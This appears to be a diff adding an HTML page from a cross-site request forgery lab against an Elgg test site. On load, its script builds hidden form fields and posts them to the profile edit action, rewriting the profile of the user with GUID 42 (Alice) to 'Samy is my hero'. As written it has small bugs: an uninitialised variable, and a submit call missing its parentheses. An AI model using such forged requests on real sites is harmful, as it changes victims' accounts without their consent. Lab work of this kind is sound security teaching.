@@ -1,0 +1,55 @@
+<html>
+  <head>
+    <title>Web Site</title>
+  </head>
+  <body>
+    This is a POST request!
+  </body>
+  <script>
+    function send_post(){
+      // 创建表单元素
+      var req = document.createElement("form");
+
+      var content;
+      content += "<input type='hidden' name='name' value='Alice'>";
+      // 个人主页描述
+      content += "<input type='hidden' name='description' value='Samy is my hero'>"
+      content += "<input type='hidden' name='accesslevel[description]' value='2'>";
+
+      content += "<input type='hidden' name='briefdescription' value=''>";
+      content += "<input type='hidden' name='accesslevel[briefdescription]' value='2'>";
+      content += "<input type='hidden' name='contactemail' value=''>";
+      content += "<input type='hidden' name='accesslevel[contactemail]' value='2'>";
+      content += "<input type='hidden' name='interests' value=''>";
+      content += "<input type='hidden' name='accesslevel[interests]' value='2'>";
+      content += "<input type='hidden' name='location' value=''>";
+      content += "<input type='hidden' name='accesslevel[location]' value='2'>";
+      content += "<input type='hidden' name='mobile' value=''>";
+      content += "<input type='hidden' name='accesslevel[mobile]' value='2'>";
+      content += "<input type='hidden' name='phone' value=''>";
+      content += "<input type='hidden' name='accesslevel[phone]' value='2'>";
+      content += "<input type='hidden' name='skills' value=''>";
+      content += "<input type='hidden' name='accesslevel[skills]' value='2'>";
+      content += "<input type='hidden' name='twitter' value=''>";
+      content += "<input type='hidden' name='accesslevel[twitter]' value='2'>";
+      content += "<input type='hidden' name='website' value=''>";
+      content += "<input type='hidden' name='accesslevel[website]' value='2'>";
+      // Alice的GUID
+      content += "<input type='hidden' name='guid' value='42'>";
+
+
+      // 修改表单元素信息
+      req.action = "http://www.csrflabelgg.com/action/profile/edit";
+      req.innerHTML = content;
+      req.target = "_self";
+      req.method = "post";  // POST请求
+
+      // 将创建的表单元素添加到文档的body中,用于后续提交表单
+      document.body.appendChild(req);
+      // 提交表单
+      req.submit;
+    }
+    // 页面加载的时候运行
+    window.onload = function() { send_post() }
+  </script>
+</html>
